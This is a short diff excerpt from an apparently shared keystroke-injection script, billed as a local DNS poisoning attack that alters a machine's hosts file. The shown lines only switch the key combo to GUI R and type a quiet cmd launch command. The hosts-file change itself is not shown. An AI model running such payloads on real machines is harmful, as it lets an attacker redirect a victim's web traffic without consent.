@@ -2,7 +2,7 @@ The following is a local DNS poisoning attack that changes a hosts 'host' file. 
 
 ```
 REM Author:ashbreeze96 and overwraith
-CONTROL ESCAPE
+GUI R
 STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
 DELAY 500
 ENTER
